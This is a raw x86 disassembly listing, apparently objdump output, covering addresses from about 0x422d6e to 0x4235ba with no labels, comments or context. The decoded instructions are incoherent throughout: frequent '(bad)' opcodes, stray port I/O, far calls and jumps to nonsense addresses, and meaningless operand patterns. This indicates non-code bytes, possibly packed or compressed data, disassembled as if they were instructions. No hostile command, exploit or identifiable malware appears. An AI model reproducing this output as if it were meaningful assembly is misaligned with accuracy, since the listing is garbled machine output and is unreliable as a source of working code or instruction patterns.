  422d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d6f:	jmp    DWORD PTR [ecx+0x0]
  422d72:	add    BYTE PTR [eax],al
  422d74:	push   0x76
  422d76:	xchg   esp,eax
  422d77:	int3   
  422d78:	add    BYTE PTR [eax+0x13ff07ff],dh
  422d7e:	jnp    0x422d7f
  422d80:	add    eax,0xa3ff00cc
  422d85:	in     eax,0x73
  422d87:	dec    DWORD PTR [ecx-0xf333f6]
  422d8d:	mov    bh,0xde
  422d8f:	inc    eax
  422d91:	mov    DWORD PTR [ebx-0x77b28e7d],eax
  422d97:	(bad)  
  422d98:	jmp    FWORD PTR [ebx+eax*4-0x4c]
  422d9c:	jmp    DWORD PTR [esi+0xe0ffc9]
  422da2:	inc    DWORD PTR [eax]
  422da4:	int    0x98
  422da6:	add    edi,edi
  422da8:	add    BYTE PTR [esi-0x76000e01],cl
  422dae:	push   0x0
  422db0:	imul   edi,edi,0x0
  422db3:	call   FWORD PTR [eax+eiz*8+0x12]
  422db7:	mov    edi,edi
  422db9:	mov    BYTE PTR [eax],0xa3
  422dbc:	call   DWORD PTR [esi]
  422dbe:	ret    0x5a00
  422dc1:	(bad)  
  422dc2:	(bad)  
  422dc3:	dec    DWORD PTR [ecx+0x89d08a]
  422dc9:	cmp    eax,0xe583d9ff
  422dce:	jmp    0x17ff:0xcc8395ff
  422dd5:	mov    bh,0xc1
  422dd7:	add    BYTE PTR [eax],al
  422dd9:	push   ecx
  422dda:	(bad)  
  422ddb:	dec    DWORD PTR ds:[eax-0x25]
  422ddf:	int3   
  422de0:	(bad)  
  422de1:	(bad)  
  422de2:	(bad)  
  422de3:	(bad)  
  422de4:	js     0x422dbe
  422de6:	idiv   edi
  422de8:	call   FWORD PTR [ecx+0x0]
  422deb:	pop    eax
  422dec:	mov    DWORD PTR [ebx],edi
  422dee:	daa    
  422def:	int3   
  422df0:	mov    eax,ds:0x93ff00ff
  422df5:	xchg   edx,eax
  422df6:	in     al,0x0
  422df8:	call   ebp
  422dfa:	inc    DWORD PTR [eax]
  422dfc:	inc    edi
  422dfe:	inc    edi
  422dff:	call   DWORD PTR [esi+0x3b83ff89]
  422e05:	loopne 0x422e15
  422e07:	add    ah,cl
  422e09:	test   DWORD PTR [ebx+0x159fffaa],0xffff9083
  422e13:	sub    DWORD PTR [ecx],0x48
  422e16:	(bad)  
  422e18:	add    dh,bl
  422e1a:	add    BYTE PTR [esi],cl
  422e1c:	add    BYTE PTR [eax+0x2d],cl
  422e1f:	add    BYTE PTR [eax+0x52cc00ff],dl
  422e25:	clc    
  422e26:	push   es
  422e27:	cmp    edi,0xffffff99
  422e2a:	or     DWORD PTR [eax+eax*1-0x590043c1],0xffffff83
  422e32:	(bad)  
  422e33:	call   FWORD PTR [edx-0xff5854]
  422e39:	sar    bh,cl
  422e3b:	add    DWORD PTR [eax],0x62ff970e
  422e41:	add    bh,bh
  422e43:	mov    ebp,ebx
  422e45:	xchg   ebx,eax
  422e46:	cmp    edi,edi
  422e48:	add    BYTE PTR [edi+edi*8-0x6f010071],bl
  422e4f:	int3   
  422e50:	cwde   
  422e51:	add    DWORD PTR [eax],0x0
  422e54:	jmp    ebp
  422e56:	nop
  422e57:	(bad)  
  422e58:	(bad)  
  422e59:	clc    
  422e5a:	call   DWORD PTR [edi-0x7d]
  422e5d:	push   cs
  422e5e:	hlt    
  422e5f:	mov    DWORD PTR [eax-0x7d],edi
  422e62:	add    BYTE PTR [eax],al
  422e64:	clc    
  422e65:	call   0xa9432e05
  422e6a:	int3   
  422e6b:	dec    ebx
  422e6c:	int3   
  422e6d:	dec    edi
  422e6e:	add    eax,0xffb3ff
  422e73:	xor    edi,0xffffffcd
  422e76:	cmp    eax,0xff08ffff
  422e7b:	dec    esp
  422e7c:	call   DWORD PTR [ebx-0x8eff19]
  422e82:	add    BYTE PTR [eax],al
  422e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e85:	xor    dl,bl
  422e87:	add    bh,bh
  422e89:	jl     0x422e8b
  422e8b:	test   edi,edi
  422e8d:	icebp  
  422e8e:	dec    edi
  422e8f:	(bad)  
  422e90:	mov    esp,0x4d000089
  422e95:	mov    dl,0xfd
  422e97:	(bad)  
  422e98:	(bad)  
  422e99:	fiadd  DWORD PTR [eax]
  422e9b:	out    dx,al
  422e9c:	mov    DWORD PTR [edx-0x23],ecx
  422e9f:	inc    DWORD PTR [edi]
  422ea1:	(bad)  
  422ea2:	(bad)  
  422ea3:	jmp    esp
  422ea5:	out    0xe,al
  422ea7:	add    BYTE PTR [eax],al
  422ea9:	mov    ch,0x0
  422eab:	repnz cmp DWORD PTR [esi+0x32],0x0
  422eb0:	mov    ebx,0x889ffff
  422eb5:	sahf   
  422eb6:	add    BYTE PTR [eax],0x0
  422eb9:	mov    ds:0x4ffb1ff,eax
  422ebe:	cmp    eax,DWORD PTR [ebx+0xff08]
  422ec4:	cmp    edx,DWORD PTR [ecx]
  422ec6:	push   ebx
  422ec7:	add    bh,bh
  422ec9:	in     eax,dx
  422eca:	int3   
  422ecb:	icebp  
  422ecc:	inc    esp
  422ece:	inc    eax
  422ecf:	call   FWORD PTR [eax+eax*1]
  422ed2:	(bad)  
  422ed3:	push   DWORD PTR [edi+0x11]
  422ed6:	in     eax,dx
  422ed7:	add    DWORD PTR [eax],0x27
  422eda:	xor    DWORD PTR [edi],0xffffff83
  422edd:	sub    BYTE PTR [edi-0x1],dl
  422ee0:	jnp    0x422ee1
  422ee2:	(bad)  
  422ee3:	jmp    ebx
  422ee5:	sbb    DWORD PTR [eax],ebp
  422ee7:	add    bh,bh
  422ee9:	mov    ah,0xff
  422eeb:	xor    bh,bh
  422eed:	loop   0x422efb
  422eef:	add    DWORD PTR [edx+0x7fff00ff],0xffffffec
  422ef6:	(bad)  
  422ef8:	jmp    FWORD PTR [ebp-0x1]
  422efb:	or     al,BYTE PTR [eax]
  422efd:	icebp  
  422efe:	mov    dh,0xff
  422f00:	out    0x83,eax
  422f02:	add    bh,bh
  422f04:	aam    0x4d
  422f06:	mov    dh,0xff
  422f08:	call   FWORD PTR [edi+0x0]
  422f0b:	xor    al,BYTE PTR [eax]
  422f0d:	adc    ebx,esp
  422f0f:	mov    DWORD PTR [edi-0x77],edx
  422f12:	or     esp,0x73
  422f15:	jbe    0x422eab
  422f17:	inc    DWORD PTR [eax]
  422f19:	push   esp
  422f1a:	push   DWORD PTR [edx-0x7cf45401]
  422f20:	mov    DWORD PTR [ecx+0x41ffff89],ecx
  422f26:	loopne 0x422f27
  422f28:	dec    ebp
  422f2a:	and    DWORD PTR [ecx-0x7d],0xffffffcc
  422f2e:	mov    DWORD PTR [ecx-0x7c00ff1a],ecx
  422f34:	dec    esp
  422f35:	clc    
  422f36:	xor    bh,bh
  422f38:	jmp    FWORD PTR [esi+0x51ff7fff]
  422f3e:	mov    edx,0xff9e00
  422f43:	mov    ebp,eax
  422f45:	xor    BYTE PTR ds:0xffb7ffff,al
  422f4b:	arpl   di,di
  422f4d:	adc    eax,0xff6800d6
  422f52:	inc    DWORD PTR [eax]
  422f54:	mov    eax,0xffff209f
  422f59:	mov    ecx,0x14005dff
  422f5e:	fcmove st,st(4)
  422f60:	fcos   
  422f62:	inc    DWORD PTR [eax]
  422f64:	in     eax,dx
  422f65:	inc    esp
  422f66:	test   BYTE PTR [ebx+0x44fff689],al
  422f6c:	adc    esp,0xffffff97
  422f6f:	add    BYTE PTR [esi+0x0],dh
  422f72:	dec    DWORD PTR [ecx+0x64c8c]
  422f78:	add    BYTE PTR [ecx],cl
  422f7a:	int3   
  422f7b:	push   ebp
  422f7c:	call   FWORD PTR [ebx+0x200aa]
  422f82:	(bad)  
  422f83:	call   FWORD PTR [esi+0xff5fe5]
  422f89:	lods   eax,DWORD PTR ds:[esi]
  422f8a:	xor    DWORD PTR [edx],0xffffffcc
  422f8d:	popf   
  422f8e:	arpl   di,di
  422f90:	jno    0x422f15
  422f92:	dec    DWORD PTR [ecx-0x7ca9f4df]
  422f98:	int3   
  422f99:	test   DWORD PTR [ebx-0x2de83379],eax
  422f9f:	int3   
  422fa0:	jge    0x422fa1
  422fa2:	(bad)  
  422fa3:	dec    DWORD PTR [edi]
  422fa5:	xor    bl,dh
  422fa7:	add    bh,bh
  422fa9:	int3   
  422faa:	add    BYTE PTR [esi+0x0],bh
  422fad:	mov    eax,ds:0x40ff14
  422fb2:	inc    DWORD PTR [ebx+0xa2d67d]
  422fb8:	push   ebx
  422fba:	add    BYTE PTR [edx],bh
  422fbc:	(bad)  
  422fbd:	aas    
  422fbe:	and    edi,edi
  422fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fc1:	(bad)  
  422fc2:	(bad)  
  422fc3:	inc    DWORD PTR [ecx+0x5d]
  422fc6:	daa    
  422fc7:	inc    DWORD PTR [ebx+0xebff4c]
  422fcd:	repnz lods al,BYTE PTR ds:[esi]
  422fcf:	add    BYTE PTR [esi+0x1100ccff],dl
  422fd5:	push   es
  422fd6:	mov    esp,0x2a00ff
  422fdb:	mov    esp,0xccc39089
  422fe0:	inc    ebx
  422fe1:	cmp    edi,0xffffff83
  422fe4:	loop   0x422fd6
  422fe6:	sbb    BYTE PTR [ebx-0x37ff4501],al
  422fec:	add    BYTE PTR [ebx-0x5500c5],bh
  422ff2:	inc    DWORD PTR [eax]
  422ff4:	sbb    al,0x75
  422ff6:	outs   dx,BYTE PTR ds:[esi]
  422ff7:	add    DWORD PTR [ebx+0x71ff47],0xffffff81
  422ffe:	sahf   
  422fff:	add    BYTE PTR [edi],dh
  423001:	inc    DWORD PTR [eax]
  423003:	mov    DWORD PTR [ecx-0x7c00f526],esp
  423009:	je     0x42300a
  42300b:	cmp    bh,0x1c
  42300e:	jns    0x42300f
  423010:	mov    al,0xff
  423012:	add    BYTE PTR [ecx-0x7c31acc8],cl
  423018:	inc    DWORD PTR [ebx+0x75002dcc]
  42301e:	jbe    0x42301f
  423020:	lock (bad) 
  423022:	(bad)  
  423023:	jmp    eax
  423025:	jno    0x422ffb
  423027:	(bad)  
  423028:	(bad)  
  423029:	fld    QWORD PTR [eax]
  42302b:	xor    bh,bh
  42302d:	lds    ebx,FWORD PTR [edx-0x1]
  423030:	aam    0xff
  423032:	(bad)  
  423033:	dec    DWORD PTR [edi+0x3c]
  423036:	push   0xff1c83ff
  42303b:	jne    0x42303c
  42303d:	cs (bad) 
  42303f:	jmp    FWORD PTR [eax+eax*1-0x1]
  423043:	add    dl,dh
  423045:	fs enter 0xffff,0xc1
  42304a:	inc    DWORD PTR [edi-0x770601]
  423050:	clc    
  423051:	cmp    edi,0x0
  423054:	ins    BYTE PTR es:[edi],dx
  423055:	push   0x2f
  423057:	add    ah,cl
  423059:	idiv   edi
  42305b:	push   es
  42305c:	cmp    DWORD PTR [eax],0x5d
  42305f:	mov    DWORD PTR [esi-0x6c760001],esi
  423065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423066:	push   edi
  423067:	add    bh,bh
  423069:	imul   eax,DWORD PTR [eax],0xb
  42306c:	add    BYTE PTR [edi+0x6d],bl
  42306f:	sub    edx,0xffffffff
  423072:	(bad)  
  423073:	jmp    FWORD PTR [edi+ebp*4]
  423076:	and    edi,edi
  423078:	jmp    FWORD PTR [edx-0x13ffad00]
  42307e:	push   0xffffffff
  423080:	push   ss
  423081:	or     DWORD PTR [ecx+0x3fc76fff],0x0
  423088:	add    BYTE PTR [edi-0x1],ah
  42308b:	nop
  42308c:	push   DWORD PTR [ebp+edi*2+0xff27ff]
  423093:	(bad)  
  423094:	mov    ebp,0xff002c02
  423099:	fs add ch,bl
  42309c:	add    BYTE PTR [esi-0xacff84],bl
  4230a2:	dec    DWORD PTR [ecx-0x52fab1]
  4230a8:	mov    DWORD PTR [esi],ecx
  4230aa:	and    ecx,0xffffffcc
  4230ad:	fwait
  4230ae:	je     0x4230af
  4230b0:	push   ebp
  4230b1:	add    bh,bh
  4230b3:	mov    DWORD PTR [eax+ecx*4-0x11337609],edi
  4230ba:	sbb    esi,0x0
  4230bd:	sbb    ebx,DWORD PTR [eax+eax*1-0x7c76ff52]
  4230c4:	fcmovbe st,st(0)
  4230c6:	ss mov edi,edi
  4230c9:	lahf   
  4230ca:	add    BYTE PTR [esi-0x34],cl
  4230cd:	les    esi,FWORD PTR [ebx-0x1]
  4230d0:	dec    ebx
  4230d1:	inc    DWORD PTR [ebx+0x157cc500]
  4230d7:	add    BYTE PTR [ebx-0x7c7f0012],al
  4230dd:	push   esp
  4230de:	inc    BYTE PTR [eax]
  4230e0:	push   edi
  4230e1:	(bad)  
  4230e2:	(bad)  
  4230e3:	inc    esi
  4230e5:	mov    al,0x21
  4230e7:	add    bh,bh
  4230e9:	xor    eax,DWORD PTR [ebx+0x4fe6ff1a]
  4230ef:	inc    esp
  4230f1:	add    BYTE PTR [ecx+0x7f643fff],cl
  4230f7:	add    BYTE PTR [eax],al
  4230f9:	pop    esi
  4230fa:	(bad)  
  4230fb:	cmp    bh,bh
  4230fd:	hlt    
  4230fe:	xor    bh,bh
  423100:	inc    eax
  423101:	inc    DWORD PTR [eax]
  423103:	add    BYTE PTR ds:0x4a89,ch
  423109:	pusha  
  42310a:	int3   
  42310b:	repz cmp DWORD PTR [ecx-0xec006c],0xffffff83
  423113:	jmp    FWORD PTR [edx+eax*2]
  423116:	sar    edi,cl
  423118:	inc    DWORD PTR [edi+edi*8]
  42311b:	stos   BYTE PTR es:[edi],al
  42311c:	sbb    edx,0xffffffed
  42311f:	and    ecx,0x0
  423122:	(bad)  
  423123:	call   DWORD PTR [esi-0x5059]
  423129:	sar    edi,0x95
  42312c:	jmp    DWORD PTR [eax-0x77ce5]
  423132:	inc    DWORD PTR [eax]
  423134:	dec    eax
  423135:	or     eax,0xcaff00bd
  42313a:	call   DWORD PTR [ecx-0xa66234]
  423140:	sub    eax,0x7fff83cc
  423145:	adc    eax,0xc883009b
  42314a:	call   FWORD PTR [ebp+0x0]
  42314d:	clc    
  42314e:	jbe    0x423150
  423150:	pop    eax
  423151:	inc    DWORD PTR [eax]
  423153:	sbb    ebp,0xffffffb9
  423156:	icebp  
  423157:	mov    edi,edi
  423159:	add    BYTE PTR ss:[ebx+eax*4-0x55fffb03],ah
  423161:	add    BYTE PTR [eax],al
  423163:	call   FWORD PTR [eax+0x36]
  423166:	sar    edi,1
  423168:	add    BYTE PTR [esi-0x7d],bh
  42316b:	and    edi,edi
  42316d:	push   esp
  42316e:	mov    bl,0xff
  423170:	push   0x0
  423172:	(bad)  
  423173:	push   DWORD PTR [eax-0x1a]
  423176:	or     eax,0xff42ccff
  42317b:	lds    eax,FWORD PTR [eax]
  42317d:	call   0xcca2b486
  423182:	add    BYTE PTR [eax],al
  423184:	rcr    DWORD PTR [edi+0x38],1
  423187:	(bad)  
  423188:	(bad)  
  423189:	fiadd  DWORD PTR [ebx-0x3fd3000d]
  42318f:	add    BYTE PTR [edx+0x2fffff83],dl
  423195:	pushf  
  423196:	lods   al,BYTE PTR ds:[esi]
  423197:	add    BYTE PTR [eax],al
  423199:	mov    edi,0x890dff
  42319e:	or     bh,bh
  4231a0:	sub    bh,bh
  4231a2:	add    bh,bh
  4231a4:	push   ss
  4231a5:	and    eax,0xd83ff0b
  4231aa:	push   DWORD PTR ds:0xccaffbcc
  4231b0:	inc    esp
  4231b1:	add    BYTE PTR [ebx-0x25c3b97d],al
  4231b7:	add    bh,bh
  4231b9:	mov    eax,0x6383c800
  4231be:	stos   BYTE PTR es:[edi],al
  4231bf:	(bad)  
  4231c0:	(bad)  
  4231c2:	dec    esp
  4231c4:	mov    eax,0xff9e9f
  4231c9:	jo     0x4231ca
  4231cb:	sub    DWORD PTR [eax],eax
  4231cd:	ja     0x423170
  4231cf:	call   DWORD PTR [eax-0x1e000001]
  4231d5:	xchg   edx,eax
  4231d6:	popa   
  4231d7:	add    ah,cl
  4231d9:	icebp  
  4231da:	and    esi,0x0
  4231dd:	xchg   ebp,eax
  4231de:	mov    ebx,0xff9700
  4231e3:	and    DWORD PTR [ebx-0x109c],0xffffffb8
  4231ea:	sbb    DWORD PTR [esi-0x33096434],0x4e
  4231f1:	add    bh,bh
  4231f3:	dec    eax
  4231f5:	js     0x42317b
  4231f7:	or     esp,0x1f
  4231fa:	int3   
  4231fb:	add    edi,edi
  4231fd:	test   DWORD PTR [esi-0x1],ebp
  423200:	inc    ecx
  423201:	mov    DWORD PTR [ebx-0x20cf4701],eax
  423207:	add    bh,bh
  423209:	call   0x1b4151da
  42320e:	leave  
  42320f:	add    BYTE PTR ds:0x78cccc00,dh
  423215:	in     eax,0x98
  423217:	mov    edi,edi
  423219:	out    dx,al
  42321a:	add    BYTE PTR ds:0x839874ff,cl
  423220:	outs   dx,DWORD PTR ds:[esi]
  423221:	add    BYTE PTR [eax],al
  423223:	and    DWORD PTR [esi+edx*1+0x7a],0xffffffff
  423228:	int3   
  423229:	jmp    0xbdc5b12e
  42322e:	cdq    
  42322f:	int3   
  423230:	cld    
  423231:	inc    DWORD PTR [eax]
  423233:	add    BYTE PTR [ebp-0x30],ch
  423236:	add    DWORD PTR [ecx+0x13fff000],ecx
  42323c:	cmp    DWORD PTR [esi-0x4],0x0
  423240:	cmp    eax,0x63ccffff
  423245:	jb     0x4231e7
  423247:	mov    DWORD PTR [ebx-0x7200a0],eax
  42324d:	xlat   BYTE PTR ds:[ebx]
  42324e:	in     al,dx
  42324f:	add    bh,dh
  423251:	int3   
  423252:	inc    DWORD PTR [eax]
  423254:	fstp   DWORD PTR [esi+esi*4+0x0]
  423258:	(bad)  
  423259:	jnp    0x4231de
  42325b:	xor    bh,bh
  42325d:	jne    0x423223
  42325f:	and    edi,0xffffffff
  423262:	int3   
  423263:	call   FWORD PTR [edi-0x15]
  423266:	cwde   
  423267:	add    bh,bh
  423269:	aam    0x0
  42326b:	jnp    0x42326c
  42326d:	adc    ecx,ecx
  42326f:	dec    esi
  423271:	add    bh,bh
  423273:	call   FWORD PTR [ecx-0x337c0c3f]
  423279:	mov    ecx,0x5bff0acc
  42327e:	sub    edi,edi
  423280:	int3   
  423281:	inc    DWORD PTR [eax]
  423283:	add    ch,dl
  423285:	test   al,0x5b
  423287:	mov    DWORD PTR [eax],eax
  423289:	out    0xff,eax
  42328b:	into   
  42328c:	mov    DWORD PTR [ebx],ebx
  42328e:	cli    
  42328f:	jmp    DWORD PTR [ecx-0x75ff007d]
  423295:	push   esp
  423296:	sub    bh,bh
  423298:	dec    DWORD PTR [edi-0x1]
  42329b:	and    eax,0x319fff
  4232a0:	in     eax,0x0
  4232a2:	(bad)  
  4232a3:	jmp    edx
  4232a5:	xchg   edx,eax
  4232a6:	push   ds
  4232a7:	int3   
  4232a8:	add    BYTE PTR [ebp-0x77],bl
  4232ab:	jbe    0x423236
  4232ad:	stos   DWORD PTR es:[edi],eax
  4232ae:	test   bh,bh
  4232b0:	loope  0x42327e
  4232b2:	int3   
  4232b3:	jmp    eax
  4232b5:	iret   
  4232b6:	call   0x8a37b5bb
  4232bb:	std    
  4232bc:	call   ebx
  4232be:	mov    ebp,0xffe9ff
  4232c3:	sub    eax,0x38
  4232c6:	es add bh,bh
  4232c9:	in     eax,dx
  4232ca:	dec    DWORD PTR [edx-0x7d]
  4232cd:	push   ebx
  4232ce:	pop    ecx
  4232cf:	dec    esi
  4232d1:	inc    DWORD PTR [eax]
  4232d3:	inc    ebx
  4232d5:	push   es
  4232d6:	push   eax
  4232d7:	(bad)  
  4232d8:	call   FWORD PTR [ecx-0x77ffa500]
  4232de:	pop    ss
  4232df:	(bad)  
  4232e0:	jmp    0x42326b
  4232e2:	inc    DWORD PTR [eax]
  4232e4:	and    DWORD PTR [edi],esi
  4232e6:	pop    ecx
  4232e7:	inc    DWORD PTR [ebx-0x76290050]
  4232ed:	ror    DWORD PTR [esi-0x1],1
  4232f0:	xor    edi,edi
  4232f2:	mov    edi,edi
  4232f4:	cli    
  4232f5:	dec    ebx
  4232f6:	in     eax,0x0
  4232f8:	sub    edi,0x0
  4232fb:	cmc    
  4232fc:	mov    edi,esi
  4232fe:	cmp    edi,0x22
  423304:	pop    edi
  423305:	fimul  WORD PTR [ecx-0x1]
  423308:	add    BYTE PTR [ecx-0x34],ch
  42330b:	fcos   
  42330d:	(bad)  
  42330e:	fdiv   st(7),st
  423310:	push   0x9dffcc00
  423315:	xor    eax,0xecffcc69
  42331a:	jmp    DWORD PTR [eax]
  42331c:	int3   
  42331d:	pop    ebx
  42331e:	add    BYTE PTR [ebx+0xffff02],0xcd
  423325:	aaa    
  423326:	and    al,BYTE PTR [ebx-0x44003c00]
  42332c:	adc    DWORD PTR [edi],0x69
  42332f:	add    DWORD PTR [edi-0x1],0xffffffff
  423333:	xor    DWORD PTR [esi],0x32
  423336:	mov    edi,0x7d8300
  42333b:	mov    ds:0xffe7a8ff,al
  423340:	sbb    al,BYTE PTR [eax]
  423342:	or     esp,0x47
  423345:	mov    ah,0x6
  423347:	inc    DWORD PTR [eax]
  423349:	fdivp  st(7),st
  42334b:	stos   BYTE PTR es:[edi],al
  42334c:	add    BYTE PTR [edx],cl
  42334e:	fild   DWORD PTR [ebx+0xff2e]
  423354:	rcr    DWORD PTR [ecx-0x3cffff41],cl
  42335a:	add    ch,bh
  42335c:	add    bh,al
  42335e:	test   al,0xff
  423360:	and    eax,0xfe838300
  423365:	push   0x63ffffac
  42336a:	call   DWORD PTR [ecx+0x0]
  42336d:	mov    DWORD PTR [ebx-0x7d],0xcccc0001
  423374:	add    ah,BYTE PTR [ecx+0x2400cc26]
  42337a:	int3   
  42337b:	stos   BYTE PTR es:[edi],al
  42337c:	(bad)  
  42337d:	fcomip st,st(0)
  42337f:	(bad)  
  423380:	cmp    bh,bh
  423382:	add    BYTE PTR [ebx+0x37bd78],al
  423388:	call   FWORD PTR [edi+0x0]
  42338b:	stc    
  42338c:	inc    DWORD PTR [ebx+0x63]
  42338f:	add    BYTE PTR [edi+edi*8-0xb060001],cl
  423396:	das    
  423397:	inc    DWORD PTR [eax]
  423399:	(bad)  
  42339b:	stos   BYTE PTR es:[edi],al
  42339c:	inc    esi
  42339e:	cmp    al,0x0
  4233a0:	push   es
  4233a1:	add    bh,bh
  4233a3:	push   DWORD PTR [edi]
  4233a5:	lds    edx,FWORD PTR [ecx+ecx*4+0x0]
  4233a9:	mov    cl,0x83
  4233ab:	bswap  esp
  4233ad:	ret    
  4233ae:	cmc    
  4233af:	call   DWORD PTR [esi+0x260083cc]
  4233b5:	add    eax,0xec00cc35
  4233ba:	push   DWORD PTR [esi-0x288f01]
  4233c0:	mov    DWORD PTR [eax],0xdf20cc00
  4233c6:	das    
  4233c7:	inc    DWORD PTR [eax]
  4233c9:	dec    ebx
  4233ca:	add    BYTE PTR [ebx],ah
  4233cc:	(bad)  
  4233cd:	fsubr  QWORD PTR [esi-0x33ff3a01]
  4233d3:	call   DWORD PTR [ecx+ecx*1]
  4233d6:	repz inc DWORD PTR [ebx+0x7600d1]
  4233dd:	in     eax,dx
  4233de:	jnp    0x4233e0
  4233e0:	enter  0x83ff,0xff
  4233e4:	adc    eax,0xffff577b
  4233e9:	dec    esp
  4233ea:	int3   
  4233eb:	sar    bh,0x5e
  4233ee:	add    ecx,DWORD PTR [ecx-0xffff60]
  4233f4:	(bad)
  4233f8:	add    BYTE PTR [ecx],bl
  4233fa:	inc    DWORD PTR [ebx-0x76c17801]
  423400:	js     0x423402
  423402:	(bad)  
  423403:	call   DWORD PTR [edx-0xff6b50]
  423409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42340a:	int3   
  42340b:	int3   
  42340c:	add    ch,ch
  42340e:	jge    0x42340f
  423410:	cmp    al,BYTE PTR [ebx+0x27d6ffff]
  423416:	inc    ecx
  423417:	add    BYTE PTR [eax],al
  423419:	or     cl,ah
  42341b:	test   eax,0xf1f8ff
  423420:	call   0xcc3a:0xf5ff0000
  423427:	(bad)  
  423428:	call   FWORD PTR [ebp+0x2400fbcc]
  42342e:	adc    al,BYTE PTR [eax]
  423430:	mov    ds:0x6400cc00,eax
  423435:	fs lock (bad) 
  423438:	call   edx
  42343a:	add    BYTE PTR [esi],dl
  42343c:	add    BYTE PTR [ebp+0xa],bh
  42343f:	add    bh,bl
  423441:	int3   
  423442:	mov    edi,edi
  423444:	dec    esp
  423445:	jg     0x423480
  423447:	mov    edi,edi
  423449:	mov    esp,ecx
  42344b:	xchg   esi,eax
  42344c:	add    DWORD PTR [esi-0x61],0xffffffff
  423450:	loopne 0x423452
  423452:	add    DWORD PTR [eax],0x15
  423455:	mov    ch,0x8c
  423457:	add    DWORD PTR [eax],0xfffffff9
  42345a:	int3   
  42345b:	jb     0x4233e6
  42345d:	mov    edi,DWORD PTR [edi]
  42345f:	push   DWORD PTR [edi]
  423461:	mov    DWORD PTR [eax],eax
  423463:	inc    DWORD PTR [esi]
  423465:	add    eax,DWORD PTR [eax]
  423467:	add    BYTE PTR [eax],al
  423469:	inc    ecx
  42346a:	push   DWORD PTR [edi-0xc03201]
  423470:	sbb    al,0xff
  423472:	(bad)  
  423473:	inc    ebx
  423475:	push   ds
  423476:	mov    ds:0xff898300,al
  42347b:	dec    ecx
  42347c:	(bad)  
  42347d:	jmp    0x4234c1
  42347f:	add    dh,bl
  423481:	inc    DWORD PTR [eax]
  423483:	jmp    FWORD PTR [edi+0xcc98c6]
  423489:	repz call esi
  42348c:	call   FWORD PTR [eax-0x43]
  42348f:	call   DWORD PTR [edi]
  423491:	inc    DWORD PTR [eax]
  423493:	inc    DWORD PTR [eax-0x33ffd1a3]
  423499:	or     al,0xff
  42349b:	xor    eax,0xff9c3e00
  4234a0:	xor    al,0xff
  4234a2:	add    bh,bh
  4234a4:	xor    dl,BYTE PTR [edx-0x13]
  4234a7:	add    bh,bh
  4234a9:	rol    BYTE PTR [ebx+0x285bffdf],1
  4234af:	jmp    FWORD PTR [eax-0x5900ff01]
  4234b5:	lock and bh,bh
  4234b8:	xor    edx,0xffffffff
  4234bb:	add    DWORD PTR [eax],0xe90097da
  4234c1:	(bad)  
  4234c2:	inc    DWORD PTR [eax]
  4234c4:	jmp    0x416483
  4234c9:	jb     0x4234cb
  4234cb:	push   cs
  4234cc:	or     DWORD PTR [eax+0x27],0xffffffff
  4234d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234d1:	(bad)  
  4234d2:	(bad)  
  4234d3:	jmp    FWORD PTR [ebx-0x76ffc93b]
  4234d9:	inc    ecx
  4234da:	inc    DWORD PTR [esi+0x0]
  4234dd:	dec    ebx
  4234de:	jg     0x4234ac
  4234e0:	inc    ecx
  4234e1:	cmp    edi,0xffffffff
  4234e4:	add    DWORD PTR [edx+eax*8+0x0],eax
  4234e8:	add    dh,bl
  4234ea:	int3   
  4234eb:	rol    DWORD PTR [ebx+0xffefa8],cl
  4234f1:	inc    DWORD PTR [eax]
  4234f3:	jmp    DWORD PTR [ebp-0x1]
  4234f6:	call   0x831f:0xec00cc
  4234fd:	repnz scas eax,DWORD PTR es:[edi]
  4234ff:	int3   
  423500:	std    
  423501:	cmp    edi,0xffffffff
  423504:	test   al,0x6e
  423506:	dec    ebp
  423507:	dec    esp
  423509:	sti    
  42350a:	mov    DWORD PTR [edi+edi*8-0x2a],edx
  42350e:	in     al,0x83
  423510:	add    DWORD PTR [ebx-0xeb90001],0x4ff00c3
  42351a:	add    BYTE PTR [eax-0x1],dh
  42351d:	fisubr WORD PTR [edi]
  42351f:	adc    DWORD PTR [edi+0x800ffcc],0xfffffff2
  423526:	rol    BYTE PTR [eax],cl
  423528:	mov    DWORD PTR [ebx-0x1],ecx
  42352b:	sar    bh,0xd9
  42352e:	jmp    0x418f32
  423533:	add    BYTE PTR [ecx-0x33ff9e4a],al
  423539:	pop    ds
  42353a:	(bad)  
  42353b:	fadd   DWORD PTR [ebx+0x66ccbeb3]
  423541:	dec    DWORD PTR [ecx-0x5dadb401]
  423547:	add    BYTE PTR [eax],al
  423549:	sub    edi,edi
  42354b:	and    al,0x89
  42354d:	xchg   edx,eax
  42354e:	aam    0x89
  423550:	sub    edi,edi
  423552:	int3   
  423553:	(bad)  
  423554:	in     al,dx
  423555:	push   cs
  423556:	pop    edi
  423557:	add    BYTE PTR [eax],al
  423559:	mov    BYTE PTR [ebx+0x4ca783f5],al
  42355f:	dec    DWORD PTR [ebx-0x1]
  423562:	inc    DWORD PTR [eax]
  423564:	loopne 0x4234ed
  423566:	test   bh,bh
  423568:	jmp    FWORD PTR [edi+edi*8+0x47]
  42356c:	dec    DWORD PTR [eax-0x29ff80]
  423572:	inc    DWORD PTR [eax]
  423574:	mov    esp,0xffea5e
  423579:	test   BYTE PTR [ebx-0x2d1f76d3],0x0
  423580:	sar    bh,0xff
  423583:	dec    DWORD PTR [eax-0xa4b9]
  423589:	aaa    
  42358a:	jmp    FWORD PTR [edx-0x7d]
  42358d:	dec    ebx
  42358e:	ins    BYTE PTR es:[edi],dx
  42358f:	add    BYTE PTR [ecx+ecx*4],bh
  423592:	add    bh,bh
  423594:	mov    ss,WORD PTR [esi+0x77ff0028]
  42359a:	or     DWORD PTR [edx-0x1],0x69
  42359e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42359f:	inc    DWORD PTR [edx]
  4235a1:	add    BYTE PTR [eax],al
  4235a3:	add    BYTE PTR [esi],dl
  4235a5:	mov    ch,al
  4235a7:	add    BYTE PTR [eax],al
  4235a9:	mov    esi,0x6e002cff
  4235ae:	imul   eax,DWORD PTR [eax],0x7e
  4235b1:	inc    DWORD PTR [eax]
  4235b3:	int3   
  4235b4:	sub    esi,ebp
  4235b6:	or     al,0xff
  4235b8:	add    BYTE PTR [edx],bh
  4235ba:	dec    eax
